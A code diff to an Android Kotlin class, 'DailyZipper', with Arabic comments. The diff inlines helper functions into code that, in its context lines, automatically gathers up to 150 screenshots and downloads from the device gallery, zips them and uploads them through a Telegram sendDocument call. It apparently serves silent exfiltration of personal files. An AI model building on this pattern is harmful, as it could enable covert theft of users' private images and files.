@@ -78,19 +78,6 @@ class DailyZipper(
         fun create(context: Context, scanner: Any? = null, telegram: Any? = null): DailyZipper {
             return DailyZipper(context, scanner, telegram)
         }
-
-        // ===== دوال مساعدة آمنة تماماً (لا تستخدم get) =====
-        private fun extractBoolean(obj: Any?, key: String): Boolean {
-            val map = obj as? Map<*, *> ?: return false
-            val entry = map.entries.find { it.key.toString() == key }
-            return entry?.value as? Boolean ?: false
-        }
-
-        private fun extractString(obj: Any?, key: String): String {
-            val map = obj as? Map<*, *> ?: return ""
-            val entry = map.entries.find { it.key.toString() == key }
-            return entry?.value?.toString() ?: ""
-        }
     }
 
     init {
@@ -279,7 +266,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات إلى Telegram - باستخدام extractBoolean
+    //  إرسال الملفات إلى Telegram - بدون دوال مساعدة
     // ============================================================
 
     private suspend fun safeSend(
@@ -314,11 +301,21 @@ class DailyZipper(
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
 
-                // استخراج قيمة "ok" باستخدام extractBoolean (آمن ولا يستخدم get)
+                // استخراج قيمة "ok" مباشرة بدون دوال مساعدة
                 val success = when (result) {
                     is Boolean -> result
                     is JSONObject -> result.optBoolean("ok", false)
-                    else -> extractBoolean(result, "ok")
+                    is Map<*, *> -> {
+                        var ok = false
+                        for (entry in result.entries) {
+                            if (entry.key.toString() == "ok") {
+                                ok = entry.value as? Boolean == true
+                                break
+                            }
+                        }
+                        ok
+                    }
+                    else -> false
                 }
 
                 if (success) {
@@ -626,7 +623,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  التشغيل التلقائي - باستخدام extractString
+    //  التشغيل التلقائي - بدون دوال مساعدة
     // ============================================================
 
     fun run(): Boolean {
@@ -647,10 +644,20 @@ class DailyZipper(
                     listOf("screenshot", "download").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // استخراج المسار باستخدام extractString (آمن ولا يستخدم get)
+                            // استخراج المسار مباشرة بدون دوال مساعدة
                             val path = when (item) {
                                 is JSONObject -> item.optString("path", "")
-                                else -> extractString(item, "path")
+                                is Map<*, *> -> {
+                                    var p = ""
+                                    for (entry in item.entries) {
+                                        if (entry.key.toString() == "path") {
+                                            p = entry.value?.toString() ?: ""
+                                            break
+                                        }
+                                    }
+                                    p
+                                }
+                                else -> ""
                             }
                             if (path.isNotEmpty()) {
                                 val f = File(path)
